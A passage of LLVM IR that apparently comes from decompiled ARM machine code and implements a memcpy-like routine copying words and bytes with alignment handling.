  store i32 %v2_18cd4, i32* %v1_18cd8, align 4
  %v3_18cd8 = add i32 %v0_18cd0, 20
  %v4_18cd8 = inttoptr i32 %v3_18cd8 to i32*
  %v5_18cd8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18cd8, i32* %v4_18cd8, align 4
  %v6_18cd8 = add i32 %v0_18cd0, 24
  %v7_18cd8 = inttoptr i32 %v6_18cd8 to i32*
  %v8_18cd8 = load i32, i32* @ip, align 4
  store i32 %v8_18cd8, i32* %v7_18cd8, align 4
  %v9_18cd8 = add i32 %v0_18cd0, 28
  %v10_18cd8 = inttoptr i32 %v9_18cd8 to i32*
  %v11_18cd8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18cd8, i32* %v10_18cd8, align 4
  %v12_18cd8 = add i32 %v0_18cd0, 32
  store i32 %v12_18cd8, i32* @r0, align 4
  %v0_18cdc = load i32, i32* %r2.global-to-local, align 4
  %v1_18cdc = add i32 %v0_18cdc, -32
  store i32 %v1_18cdc, i32* %r2.global-to-local, align 4
  %v3_18cdc = sub i32 31, %v0_18cdc
  %v4_18cdc = and i32 %v3_18cdc, %v0_18cdc
  %v5_18cdc = icmp slt i32 %v4_18cdc, 0
  %v6_18cdc = icmp slt i32 %v1_18cdc, 0
  %v2_18ce0 = xor i1 %v6_18cdc, %v5_18cdc
  br i1 %v2_18ce0, label %dec_label_pc_18ce4, label %dec_label_pc_18ccc.dec_label_pc_18ccc_crit_edge

dec_label_pc_18ccc.dec_label_pc_18ccc_crit_edge:  ; preds = %dec_label_pc_18ccc
  %v0_18ccc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18ccc

dec_label_pc_18ce4:                               ; preds = %dec_label_pc_18ccc
  %v1_18ce4 = add i32 %v0_18cdc, -16
  %v3_18ce4 = add i32 %v0_18cdc, 2147483616
  %v4_18ce4 = and i32 %v1_18ce4, %v3_18ce4
  %v5_18ce4 = icmp slt i32 %v4_18ce4, 0
  store i1 %v5_18ce4, i1* %cpsr_v.global-to-local, align 1
  %v6_18ce4 = icmp slt i32 %v1_18ce4, 0
  store i1 %v6_18ce4, i1* %cpsr_n.global-to-local, align 1
  %v7_18ce4 = icmp eq i32 %v1_18ce4, 0
  store i1 %v7_18ce4, i1* %cpsr_z.global-to-local, align 1
  %v2_18ce8 = xor i1 %v6_18ce4, %v5_18ce4
  br i1 %v2_18ce8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_18ce4
  %v3_18ce8 = load i32, i32* @r1, align 4
  %v4_18ce8 = inttoptr i32 %v3_18ce8 to i32*
  %v5_18ce8 = load i32, i32* %v4_18ce8, align 4
  store i32 %v5_18ce8, i32* @r3, align 4
  %v6_18ce8 = add i32 %v3_18ce8, 4
  %v7_18ce8 = inttoptr i32 %v6_18ce8 to i32*
  %v8_18ce8 = load i32, i32* %v7_18ce8, align 4
  store i32 %v8_18ce8, i32* %r4.global-to-local, align 4
  %v9_18ce8 = add i32 %v3_18ce8, 8
  %v10_18ce8 = inttoptr i32 %v9_18ce8 to i32*
  %v11_18ce8 = load i32, i32* %v10_18ce8, align 4
  store i32 %v11_18ce8, i32* @ip, align 4
  %v12_18ce8 = add i32 %v3_18ce8, 12
  %v13_18ce8 = inttoptr i32 %v12_18ce8 to i32*
  %v14_18ce8 = load i32, i32* %v13_18ce8, align 4
  store i32 %v14_18ce8, i32* %lr.global-to-local, align 4
  %v15_18ce8 = add i32 %v3_18ce8, 16
  store i32 %v15_18ce8, i32* @r1, align 4
  %v4_18cec = inttoptr i32 %v12_18cd8 to i32*
  store i32 %v5_18ce8, i32* %v4_18cec, align 4
  %v6_18cec = add i32 %v0_18cd0, 36
  %v7_18cec = inttoptr i32 %v6_18cec to i32*
  %v8_18cec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_18cec, i32* %v7_18cec, align 4
  %v9_18cec = add i32 %v0_18cd0, 40
  %v10_18cec = inttoptr i32 %v9_18cec to i32*
  %v11_18cec = load i32, i32* @ip, align 4
  store i32 %v11_18cec, i32* %v10_18cec, align 4
  %v12_18cec = add i32 %v0_18cd0, 44
  %v13_18cec = inttoptr i32 %v12_18cec to i32*
  %v14_18cec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_18cec, i32* %v13_18cec, align 4
  %v15_18cec = add i32 %v0_18cd0, 48
  store i32 %v15_18cec, i32* @r0, align 4
  %v3_18cf0 = load i32, i32* %r2.global-to-local, align 4
  %v4_18cf0 = add i32 %v3_18cf0, -16
  store i32 %v4_18cf0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_18ce4, %bb136
  %v3_18d00102111 = phi i32 [ %v15_18cec, %bb136 ], [ %v12_18cd8, %dec_label_pc_18ce4 ]
  %v0_18cf8.pre = phi i32 [ %v4_18cf0, %bb136 ], [ %v1_18cdc, %dec_label_pc_18ce4 ]
  %v2_18cf4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18cf4, i32* @r4, align 4
  br label %dec_label_pc_18cf8

dec_label_pc_18cf8:                               ; preds = %dec_label_pc_18cc0, %bb137
  %v3_18d00101 = phi i32 [ %v0_18cd094, %dec_label_pc_18cc0 ], [ %v3_18d00102111, %bb137 ]
  %v0_18cf8 = phi i32 [ %v1_18cc0, %dec_label_pc_18cc0 ], [ %v0_18cf8.pre, %bb137 ]
  %v1_18cf8 = add i32 %v0_18cf8, 20
  store i32 %v1_18cf8, i32* %r2.global-to-local, align 4
  %v3_18cf8 = sub i32 0, %v0_18cf8
  %v4_18cf8 = and i32 %v1_18cf8, %v3_18cf8
  %v5_18cf8 = icmp slt i32 %v4_18cf8, 0
  store i1 %v5_18cf8, i1* %cpsr_v.global-to-local, align 1
  %v6_18cf8 = icmp slt i32 %v1_18cf8, 0
  store i1 %v6_18cf8, i1* %cpsr_n.global-to-local, align 1
  %v7_18cf8 = icmp eq i32 %v1_18cf8, 0
  store i1 %v7_18cf8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18cfc

dec_label_pc_18cfc:                               ; preds = %.thread115, %dec_label_pc_18cf8
  %v0_18d0c.pre157 = phi i32 [ %v0_18d0c.pre, %.thread115 ], [ %v1_18cf8, %dec_label_pc_18cf8 ]
  %v3_18d00 = phi i32 [ %v3_18d0099116, %.thread115 ], [ %v3_18d00101, %dec_label_pc_18cf8 ]
  %v1_18d04 = phi i1 [ %v1_18d08, %.thread115 ], [ %v5_18cf8, %dec_label_pc_18cf8 ]
  %v0_18d04 = phi i1 [ %v0_18d08, %.thread115 ], [ %v6_18cf8, %dec_label_pc_18cf8 ]
  %v2_18cfc = xor i1 %v1_18d04, %v0_18d04
  br i1 %v2_18cfc, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_18cfc
  %v3_18cfc = load i32, i32* @r1, align 4
  %v4_18cfc = inttoptr i32 %v3_18cfc to i32*
  %v5_18cfc = load i32, i32* %v4_18cfc, align 4
  store i32 %v5_18cfc, i32* @r3, align 4
  %v6_18cfc = add i32 %v3_18cfc, 4
  %v7_18cfc = inttoptr i32 %v6_18cfc to i32*
  %v8_18cfc = load i32, i32* %v7_18cfc, align 4
  store i32 %v8_18cfc, i32* @ip, align 4
  %v9_18cfc = add i32 %v3_18cfc, 8
  %v10_18cfc = inttoptr i32 %v9_18cfc to i32*
  %v11_18cfc = load i32, i32* %v10_18cfc, align 4
  store i32 %v11_18cfc, i32* %lr.global-to-local, align 4
  %v12_18cfc = add i32 %v3_18cfc, 12
  store i32 %v12_18cfc, i32* @r1, align 4
  %v4_18d00 = inttoptr i32 %v3_18d00 to i32*
  store i32 %v5_18cfc, i32* %v4_18d00, align 4
  %v6_18d00 = add i32 %v3_18d00, 4
  %v7_18d00 = inttoptr i32 %v6_18d00 to i32*
  %v8_18d00 = load i32, i32* @ip, align 4
  store i32 %v8_18d00, i32* %v7_18d00, align 4
  %v9_18d00 = add i32 %v3_18d00, 8
  %v10_18d00 = inttoptr i32 %v9_18d00 to i32*
  %v11_18d00 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18d00, i32* %v10_18d00, align 4
  %v12_18d00 = add i32 %v3_18d00, 12
  store i32 %v12_18d00, i32* @r0, align 4
  %v3_18d04 = load i32, i32* %r2.global-to-local, align 4
  %v4_18d04 = add i32 %v3_18d04, -12
  store i32 %v4_18d04, i32* %r2.global-to-local, align 4
  %v6_18d04 = sub i32 11, %v3_18d04
  %v7_18d04 = and i32 %v6_18d04, %v3_18d04
  %v8_18d04 = icmp slt i32 %v7_18d04, 0
  store i1 %v8_18d04, i1* %cpsr_v.global-to-local, align 1
  %v9_18d04 = icmp slt i32 %v4_18d04, 0
  store i1 %v9_18d04, i1* %cpsr_n.global-to-local, align 1
  %v10_18d04 = icmp eq i32 %v3_18d04, 12
  store i1 %v10_18d04, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_18cfc, %bb138
  %v0_18d0c.pre = phi i32 [ %v4_18d04, %bb138 ], [ %v0_18d0c.pre157, %dec_label_pc_18cfc ]
  %v3_18d0099116 = phi i32 [ %v12_18d00, %bb138 ], [ %v3_18d00, %dec_label_pc_18cfc ]
  %v1_18d08 = phi i1 [ %v8_18d04, %bb138 ], [ %v1_18d04, %dec_label_pc_18cfc ]
  %v0_18d08 = phi i1 [ %v9_18d04, %bb138 ], [ %v0_18d04, %dec_label_pc_18cfc ]
  %v2_18d08 = xor i1 %v1_18d08, %v0_18d08
  br i1 %v2_18d08, label %dec_label_pc_18d0c, label %dec_label_pc_18cfc

dec_label_pc_18d0c:                               ; preds = %.thread115, %dec_label_pc_18cb8
  %v4_18d1c = phi i32 [ %v0_18cd094, %dec_label_pc_18cb8 ], [ %v3_18d0099116, %.thread115 ]
  %v0_18d0c = phi i32 [ %v1_18cb8, %dec_label_pc_18cb8 ], [ %v0_18d0c.pre, %.thread115 ]
  %v1_18d0c = add i32 %v0_18d0c, 8
  store i32 %v1_18d0c, i32* %r2.global-to-local, align 4
  %v3_18d0c = sub i32 0, %v0_18d0c
  %v4_18d0c = and i32 %v1_18d0c, %v3_18d0c
  %v5_18d0c = icmp slt i32 %v4_18d0c, 0
  store i1 %v5_18d0c, i1* %cpsr_v.global-to-local, align 1
  %v6_18d0c = icmp slt i32 %v1_18d0c, 0
  store i1 %v6_18d0c, i1* %cpsr_n.global-to-local, align 1
  %v7_18d0c = icmp eq i32 %v1_18d0c, 0
  store i1 %v7_18d0c, i1* %cpsr_z.global-to-local, align 1
  %v2_18d10 = xor i1 %v6_18d0c, %v5_18d0c
  br i1 %v2_18d10, label %bb140, label %dec_label_pc_18d14

dec_label_pc_18d14:                               ; preds = %dec_label_pc_18d0c
  %v1_18d14 = add i32 %v0_18d0c, 4
  store i32 %v1_18d14, i32* %r2.global-to-local, align 4
  %v3_18d14 = sub i32 -5, %v0_18d0c
  %v4_18d14 = and i32 %v3_18d14, %v1_18d0c
  %v5_18d14 = icmp slt i32 %v4_18d14, 0
  store i1 %v5_18d14, i1* %cpsr_v.global-to-local, align 1
  %v6_18d14 = icmp slt i32 %v1_18d14, 0
  store i1 %v6_18d14, i1* %cpsr_n.global-to-local, align 1
  %v7_18d14 = icmp eq i32 %v1_18d0c, 4
  store i1 %v7_18d14, i1* %cpsr_z.global-to-local, align 1
  %v2_18d18 = xor i1 %v6_18d14, %v5_18d14
  %v3_18d18 = load i32, i32* @r1, align 4
  %v4_18d18 = inttoptr i32 %v3_18d18 to i32*
  %v5_18d18 = load i32, i32* %v4_18d18, align 4
  store i32 %v5_18d18, i32* @r3, align 4
  %v7_18d18 = add i32 %v3_18d18, 4
  br i1 %v2_18d18, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_18d14
  store i32 %v7_18d18, i32* @r1, align 4
  %v5_18d1c = inttoptr i32 %v4_18d1c to i32*
  store i32 %v5_18d18, i32* %v5_18d1c, align 4
  %v6_18d1c = load i32, i32* @r0, align 4
  %v7_18d1c = add i32 %v6_18d1c, 4
  store i32 %v7_18d1c, i32* @r0, align 4
  %v0_18d2c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_18d14
  %v7_18d20 = inttoptr i32 %v7_18d18 to i32*
  %v8_18d20 = load i32, i32* %v7_18d20, align 4
  store i32 %v8_18d20, i32* @ip, align 4
  %v9_18d20 = add i32 %v3_18d18, 8
  store i32 %v9_18d20, i32* @r1, align 4
  %v4_18d24 = inttoptr i32 %v4_18d1c to i32*
  store i32 %v5_18d18, i32* %v4_18d24, align 4
  %v6_18d24 = add i32 %v4_18d1c, 4
  %v7_18d24 = inttoptr i32 %v6_18d24 to i32*
  %v8_18d24 = load i32, i32* @ip, align 4
  store i32 %v8_18d24, i32* %v7_18d24, align 4
  %v9_18d24 = add i32 %v4_18d1c, 8
  store i32 %v9_18d24, i32* @r0, align 4
  %v3_18d28 = load i32, i32* %r2.global-to-local, align 4
  %v4_18d28 = add i32 %v3_18d28, -4
  store i32 %v4_18d28, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_18d0c, %bb, %dec_label_pc_18edc, %dec_label_pc_18e70, %dec_label_pc_18e04, %bb139
  %v0_18d2c = phi i32 [ %v0_18d2c.pre, %.thread122 ], [ %v2_18d7c, %.thread128 ], [ %v1_18d0c, %dec_label_pc_18d0c ], [ %v2_18ca0, %bb ], [ %v0_18d2c61, %dec_label_pc_18edc ], [ %v0_18d2c60, %dec_label_pc_18e70 ], [ %v0_18d2c59, %dec_label_pc_18e04 ], [ %v4_18d28, %bb139 ]
  %v1_18d2c = add i32 %v0_18d2c, 4
  store i32 %v1_18d2c, i32* %r2.global-to-local, align 4
  %v3_18d2c = sub i32 0, %v0_18d2c
  %v4_18d2c = and i32 %v1_18d2c, %v3_18d2c
  %v5_18d2c = icmp slt i32 %v4_18d2c, 0
  store i1 %v5_18d2c, i1* %cpsr_v.global-to-local, align 1
  %v6_18d2c = icmp slt i32 %v1_18d2c, 0
  store i1 %v6_18d2c, i1* %cpsr_n.global-to-local, align 1
  %v7_18d2c = icmp eq i32 %v1_18d2c, 0
  store i1 %v7_18d2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d2c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_18d34.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_18d30 = load i8*, i8** %stack_var_-8, align 4
  %v4_18d30 = ptrtoint i8* %v3_18d30 to i32
  store i32 %v4_18d30, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_18d34 = phi i32 [ %v0_18d34.pre, %bb140.bb142_crit_edge ], [ %v8_18c9c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_18d2c, i32 %v0_18d34)
  %v0_18d38 = load i32, i32* %r2.global-to-local, align 4
  %v1_18d38 = add i32 %v0_18d38, -2
  %v3_18d38 = sub i32 1, %v0_18d38
  %v4_18d38 = and i32 %v3_18d38, %v0_18d38
  %v5_18d38 = icmp slt i32 %v4_18d38, 0
  store i1 %v5_18d38, i1* %cpsr_v.global-to-local, align 1
  %v6_18d38 = icmp slt i32 %v1_18d38, 0
  store i1 %v6_18d38, i1* %cpsr_n.global-to-local, align 1
  %v7_18d38 = icmp eq i32 %v0_18d38, 2
  store i1 %v7_18d38, i1* %cpsr_z.global-to-local, align 1
  %v0_18d3c = load i32, i32* @r1, align 4
  %v1_18d3c = inttoptr i32 %v0_18d3c to i8*
  %v2_18d3c = load i8, i8* %v1_18d3c, align 1
  %v5_18d3c = add i32 %v0_18d3c, 1
  store i32 %v5_18d3c, i32* %r1.global-to-local, align 4
  %v2_18d40 = load i32, i32* @r0, align 4
  %v3_18d40 = inttoptr i32 %v2_18d40 to i8*
  store i8 %v2_18d3c, i8* %v3_18d40, align 1
  %v4_18d40 = load i32, i32* @r0, align 4
  %v5_18d40 = add i32 %v4_18d40, 1
  store i32 %v5_18d40, i32* %r0.global-to-local, align 4
  %v0_18d44 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18d44 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18d44 = xor i1 %v0_18d44, %v1_18d44
  br i1 %v2_18d44, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_18d44 = load i32, i32* %r1.global-to-local, align 4
  %v4_18d44 = inttoptr i32 %v3_18d44 to i8*
  %v5_18d44 = load i8, i8* %v4_18d44, align 1
  %v8_18d44 = add i32 %v3_18d44, 1
  store i32 %v8_18d44, i32* %r1.global-to-local, align 4
  %v6_18d48 = inttoptr i32 %v5_18d40 to i8*
  store i8 %v5_18d44, i8* %v6_18d48, align 1
  %v7_18d48 = load i32, i32* %r0.global-to-local, align 4
  %v8_18d48 = add i32 %v7_18d48, 1
  store i32 %v8_18d48, i32* %r0.global-to-local, align 4
  %v1_18d4c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18d4c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_18d50 = phi i32 [ %v8_18d48, %bb143 ], [ %v5_18d40, %bb142 ]
  %v2_18d50 = phi i1 [ %v2_18d4c.pre, %bb143 ], [ %v1_18d44, %bb142 ]
  %v1_18d50 = phi i1 [ %v1_18d4c.pre, %bb143 ], [ %v0_18d44, %bb142 ]
  %v0_18d4c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18d4c = xor i1 %v2_18d50, %v1_18d50
  %v4_18d4c = or i1 %v0_18d4c, %v3_18d4c
  br i1 %v4_18d4c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_18d4c = load i32, i32* %r1.global-to-local, align 4
  %v6_18d4c = inttoptr i32 %v5_18d4c to i8*
  %v7_18d4c = load i8, i8* %v6_18d4c, align 1
  %v10_18d4c = add i32 %v5_18d4c, 1
  store i32 %v10_18d4c, i32* %r1.global-to-local, align 4
  %v8_18d50 = inttoptr i32 %v7_18d50 to i8*
  store i8 %v7_18d4c, i8* %v8_18d50, align 1
  %v9_18d50 = load i32, i32* %r0.global-to-local, align 4
  %v10_18d50 = add i32 %v9_18d50, 1
  store i32 %v10_18d50, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_18d54 = load i8*, i8** %stack_var_-8, align 4
  %v3_18d54 = ptrtoint i8* %v2_18d54 to i32
  store i32 %v3_18d54, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_18c9c)
  %v0_18d5c.pre = load i32, i32* @ip, align 4
  %v0_18d64.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_18d68.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_18d5c

dec_label_pc_18d5c:                               ; preds = %dec_label_pc_18ca8, %.thread126
  %v2_18d68 = phi i32 [ %v1_18c90, %dec_label_pc_18ca8 ], [ %v2_18d68.pre, %.thread126 ]
  %v0_18d64 = phi i32 [ %v0_18c90, %dec_label_pc_18ca8 ], [ %v0_18d64.pre, %.thread126 ]
  %v0_18d5c = phi i32 [ %v1_18ca8, %dec_label_pc_18ca8 ], [ %v0_18d5c.pre, %.thread126 ]
  %v1_18d5c = sub i32 4, %v0_18d5c
  store i32 %v1_18d5c, i32* @ip, align 4
  %v1_18d60 = add i32 %v1_18d5c, -2
  %v3_18d60 = sub i32 1, %v1_18d5c
  %v4_18d60 = and i32 %v3_18d60, %v1_18d5c
  %v5_18d60 = icmp slt i32 %v4_18d60, 0
  store i1 %v5_18d60, i1* %cpsr_v.global-to-local, align 1
  %v6_18d60 = icmp slt i32 %v1_18d60, 0
  store i1 %v6_18d60, i1* %cpsr_n.global-to-local, align 1
  %v7_18d60 = icmp eq i32 %v1_18d5c, 2
  store i1 %v7_18d60, i1* %cpsr_z.global-to-local, align 1
  %v1_18d64 = inttoptr i32 %v0_18d64 to i8*
  %v2_18d64 = load i8, i8* %v1_18d64, align 1
  %v3_18d64 = zext i8 %v2_18d64 to i32
  store i32 %v3_18d64, i32* @r3, align 4
  %v5_18d64 = add i32 %v0_18d64, 1
  store i32 %v5_18d64, i32* @r1, align 4
  %v3_18d68 = inttoptr i32 %v2_18d68 to i8*
  store i8 %v2_18d64, i8* %v3_18d68, align 1
  %v4_18d68 = load i32, i32* @r0, align 4
  %v5_18d68 = add i32 %v4_18d68, 1
  store i32 %v5_18d68, i32* @r0, align 4
  %v0_18d6c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18d6c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18d6c = xor i1 %v0_18d6c, %v1_18d6c
  br i1 %v2_18d6c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_18d5c
  %v3_18d6c = load i32, i32* @r1, align 4
  %v4_18d6c = inttoptr i32 %v3_18d6c to i8*
  %v5_18d6c = load i8, i8* %v4_18d6c, align 1
  %v6_18d6c = zext i8 %v5_18d6c to i32
  store i32 %v6_18d6c, i32* @r3, align 4
  %v8_18d6c = add i32 %v3_18d6c, 1
  store i32 %v8_18d6c, i32* @r1, align 4
  %v6_18d70 = inttoptr i32 %v5_18d68 to i8*
  store i8 %v5_18d6c, i8* %v6_18d70, align 1
  %v7_18d70 = load i32, i32* @r0, align 4
  %v8_18d70 = add i32 %v7_18d70, 1
  store i32 %v8_18d70, i32* @r0, align 4
  %v1_18d74.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18d74.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_18d5c, %bb145
  %v7_18d78 = phi i32 [ %v8_18d70, %bb145 ], [ %v5_18d68, %dec_label_pc_18d5c ]
  %v2_18d78 = phi i1 [ %v2_18d74.pre, %bb145 ], [ %v1_18d6c, %dec_label_pc_18d5c ]
  %v1_18d78 = phi i1 [ %v1_18d74.pre, %bb145 ], [ %v0_18d6c, %dec_label_pc_18d5c ]
  %v0_18d74 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18d74 = xor i1 %v2_18d78, %v1_18d78
  %v4_18d74 = or i1 %v0_18d74, %v3_18d74
  br i1 %v4_18d74, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_18d74 = load i32, i32* @r1, align 4
  %v6_18d74 = inttoptr i32 %v5_18d74 to i8*
  %v7_18d74 = load i8, i8* %v6_18d74, align 1
  %v8_18d74 = zext i8 %v7_18d74 to i32
  store i32 %v8_18d74, i32* @r3, align 4
  %v10_18d74 = add i32 %v5_18d74, 1
  store i32 %v10_18d74, i32* @r1, align 4
  %v8_18d78 = inttoptr i32 %v7_18d78 to i8*
  store i8 %v7_18d74, i8* %v8_18d78, align 1
  %v9_18d78 = load i32, i32* @r0, align 4
  %v10_18d78 = add i32 %v9_18d78, 1
  store i32 %v10_18d78, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_18eac77 = phi i32 [ %v10_18d78, %bb146 ], [ %v7_18d78, %.thread127 ]
  %v0_18d7c = load i32, i32* %r2.global-to-local, align 4
  %v1_18d7c = load i32, i32* @ip, align 4
  %v2_18d7c = sub i32 %v0_18d7c, %v1_18d7c
  store i32 %v2_18d7c, i32* %r2.global-to-local, align 4
  %v4_18d7c = xor i32 %v1_18d7c, %v0_18d7c
  %v5_18d7c = xor i32 %v2_18d7c, %v0_18d7c
  %v6_18d7c = and i32 %v5_18d7c, %v4_18d7c
  %v7_18d7c = icmp slt i32 %v6_18d7c, 0
  store i1 %v7_18d7c, i1* %cpsr_v.global-to-local, align 1
  %v8_18d7c = icmp slt i32 %v2_18d7c, 0
  store i1 %v8_18d7c, i1* %cpsr_n.global-to-local, align 1
  %v9_18d7c = icmp eq i32 %v0_18d7c, %v1_18d7c
  store i1 %v9_18d7c, i1* %cpsr_z.global-to-local, align 1
  %v2_18d80 = xor i1 %v8_18d7c, %v7_18d7c
  br i1 %v2_18d80, label %bb140, label %dec_label_pc_18d84

dec_label_pc_18d84:                               ; preds = %.thread128
  %v0_18d84 = load i32, i32* @r1, align 4
  %v1_18d84 = urem i32 %v0_18d84, 4
  store i32 %v1_18d84, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18d84 = icmp eq i32 %v1_18d84, 0
  store i1 %v2_18d84, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_18d84 to i2
  br i1 %v2_18d84, label %dec_label_pc_18cb8, label %dec_label_pc_18d8c

dec_label_pc_18d8c:                               ; preds = %dec_label_pc_18cb0, %dec_label_pc_18d84
  %v0_18eac76 = phi i32 [ %v1_18c90, %dec_label_pc_18cb0 ], [ %v0_18eac77, %dec_label_pc_18d84 ]
  %v0_18e14 = phi i32 [ %v2_18ca0, %dec_label_pc_18cb0 ], [ %v2_18d7c, %dec_label_pc_18d84 ]
  %v0_18d94.off0 = phi i2 [ %extract.t, %dec_label_pc_18cb0 ], [ %extract.t131, %dec_label_pc_18d84 ]
  %v0_18d8c = phi i32 [ %v0_18c90, %dec_label_pc_18cb0 ], [ %v0_18d84, %dec_label_pc_18d84 ]
  %v1_18d8c = and i32 %v0_18d8c, -4
  store i32 %v1_18d8c, i32* %r1.global-to-local, align 4
  %v1_18d90 = inttoptr i32 %v1_18d8c to i32*
  %v2_18d90 = load i32, i32* %v1_18d90, align 4
  store i32 %v2_18d90, i32* %lr.global-to-local, align 4
  %v4_18d90 = add i32 %v1_18d8c, 4
  store i32 %v4_18d90, i32* %r1.global-to-local, align 4
  %v1_18e0c = add i32 %v0_18e14, -12
  %v3_18e0c = sub i32 11, %v0_18e14
  %v4_18e0c = and i32 %v3_18e0c, %v0_18e14
  %v5_18e0c = icmp slt i32 %v4_18e0c, 0
  store i1 %v5_18e0c, i1* %cpsr_v.global-to-local, align 1
  %v6_18e0c = icmp slt i32 %v1_18e0c, 0
  store i1 %v6_18e0c, i1* %cpsr_n.global-to-local, align 1
  %v7_18e0c = icmp eq i32 %v0_18e14, 12
  store i1 %v7_18e0c, i1* %cpsr_z.global-to-local, align 1
  %v2_18e10 = xor i1 %v6_18e0c, %v5_18e0c
  switch i2 %v0_18d94.off0, label %dec_label_pc_18da0 [
    i2 -1, label %dec_label_pc_18e78
    i2 -2, label %dec_label_pc_18e0c
  ]

dec_label_pc_18da0:                               ; preds = %dec_label_pc_18d8c
  br i1 %v2_18e10, label %dec_label_pc_18dec, label %dec_label_pc_18da8

dec_label_pc_18da8:                               ; preds = %dec_label_pc_18da0
  store i32 %v1_18e0c, i32* %r2.global-to-local, align 4
  %v3_18dac = load i32, i32* @r4, align 4
  store i32 %v3_18dac, i32* %stack_var_-16, align 4
  %v6_18dac = load i32, i32* @r5, align 4
  store i32 %v6_18dac, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18db0

dec_label_pc_18db0:                               ; preds = %dec_label_pc_18db0.dec_label_pc_18db0_crit_edge, %dec_label_pc_18da8
  %v0_18dd4 = phi i32 [ %v12_18dd4, %dec_label_pc_18db0.dec_label_pc_18db0_crit_edge ], [ %v0_18eac76, %dec_label_pc_18da8 ]
  %v0_18db4 = phi i32 [ %v0_18db4.pre, %dec_label_pc_18db0.dec_label_pc_18db0_crit_edge ], [ %v4_18d90, %dec_label_pc_18da8 ]
  %v0_18db0 = phi i32 [ %v0_18db0.pre, %dec_label_pc_18db0.dec_label_pc_18db0_crit_edge ], [ %v2_18d90, %dec_label_pc_18da8 ]
  %v3_18db0 = udiv i32 %v0_18db0, 256
  %v1_18db4 = inttoptr i32 %v0_18db4 to i32*
  %v2_18db4 = load i32, i32* %v1_18db4, align 4
  store i32 %v2_18db4, i32* %r4.global-to-local, align 4
  %v3_18db4 = add i32 %v0_18db4, 4
  %v4_18db4 = inttoptr i32 %v3_18db4 to i32*
  %v5_18db4 = load i32, i32* %v4_18db4, align 4
  store i32 %v5_18db4, i32* %r5.global-to-local, align 4
  %v6_18db4 = add i32 %v0_18db4, 8
  %v7_18db4 = inttoptr i32 %v6_18db4 to i32*
  %v8_18db4 = load i32, i32* %v7_18db4, align 4
  store i32 %v8_18db4, i32* %ip.global-to-local, align 4
  %v9_18db4 = add i32 %v0_18db4, 12
  %v10_18db4 = inttoptr i32 %v9_18db4 to i32*
  %v11_18db4 = load i32, i32* %v10_18db4, align 4
  store i32 %v11_18db4, i32* %lr.global-to-local, align 4
  %v12_18db4 = add i32 %v0_18db4, 16
  store i32 %v12_18db4, i32* %r1.global-to-local, align 4
  %v4_18db8 = mul i32 %v2_18db4, 16777216
  %v5_18db8 = or i32 %v4_18db8, %v3_18db0
  store i32 %v5_18db8, i32* @r3, align 4
  %v3_18dbc = udiv i32 %v2_18db4, 256
  %v4_18dc0 = mul i32 %v5_18db4, 16777216
  %v5_18dc0 = or i32 %v4_18dc0, %v3_18dbc
  store i32 %v5_18dc0, i32* %r4.global-to-local, align 4
  %v3_18dc4 = udiv i32 %v5_18db4, 256
  %v4_18dc8 = mul i32 %v8_18db4, 16777216
  %v5_18dc8 = or i32 %v4_18dc8, %v3_18dc4
  store i32 %v5_18dc8, i32* %r5.global-to-local, align 4
  %v3_18dcc = udiv i32 %v8_18db4, 256
  %v4_18dd0 = mul i32 %v11_18db4, 16777216
  %v5_18dd0 = or i32 %v4_18dd0, %v3_18dcc
  store i32 %v5_18dd0, i32* @ip, align 4
  %v1_18dd4 = inttoptr i32 %v0_18dd4 to i32*
  store i32 %v5_18db8, i32* %v1_18dd4, align 4
  %v3_18dd4 = add i32 %v0_18dd4, 4
